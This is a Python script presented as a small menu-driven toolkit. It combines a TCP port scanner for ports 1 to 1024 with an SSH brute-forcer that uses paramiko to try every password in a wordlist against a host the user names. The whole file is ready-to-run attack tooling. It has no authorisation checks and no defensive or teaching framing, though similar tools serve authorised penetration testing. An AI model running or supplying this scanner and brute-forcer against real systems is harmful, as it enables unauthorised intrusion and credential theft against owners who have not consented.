import socket
import paramiko

def scan_ports(target):
    print(f"\n[*] Scanning ports on {target}...\n")
    for port in range(1, 1025):
        try:
            sock = socket.socket()
            sock.settimeout(0.5)
            sock.connect((target, port))
            print(f"[+] Port {port} is open")
            sock.close()
        except:
            continue

def ssh_brute_force(host, username, wordlist_path):
    print(f"\n[*] Starting SSH brute-force on {host} with user '{username}'\n")

    try:
        with open(wordlist_path, "r") as f:
            for password in f:
                password = password.strip()
                try:
                    print(f"[-] Trying: {password}")
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, username=username, password=password, timeout=3)
                    print(f"[+] Success! Password found: {password}")
                    client.close()
                    return
                except paramiko.AuthenticationException:
                    continue
                except Exception as e:
                    print(f"[!] Error: {e}")
                    break
    except FileNotFoundError:
        print("[!] Wordlist file not found.")
    print("[-] Brute-force failed. No valid password found.")

def menu():
    while True:
        print("""
1. Port Scanner
2. SSH Brute-Forcer
3. Exit
        """)
        choice = input("Select an option (1/2/3): ")

        if choice == "1":
            target = input("Enter target IP or domain: ")
            scan_ports(target)
        elif choice == "2":
            host = input("SSH Host IP: ")
            username = input("Username: ")
            wordlist = input("Path to password wordlist: ")
            ssh_brute_force(host, username, wordlist)
        elif choice == "3":
            print("Exiting toolkit...")
            break
        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    menu()
